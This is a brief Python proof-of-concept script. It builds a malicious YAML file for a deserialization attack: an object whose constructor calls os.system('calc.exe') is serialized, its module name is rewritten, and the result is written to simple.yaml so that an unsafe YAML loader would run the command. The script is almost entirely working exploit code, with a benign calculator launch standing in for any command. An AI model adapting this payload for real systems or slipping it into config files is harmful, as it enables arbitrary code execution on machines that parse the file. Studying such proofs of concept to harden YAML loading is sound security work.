import yaml
import os

class poc:
    def __init__(self):
        os.system("calc.exe")

payload = yaml.dump(poc())
payload = payload.replace("__main__","yaml1")#
print(payload)

fp = open('simple.yaml','w')
fp.write(payload)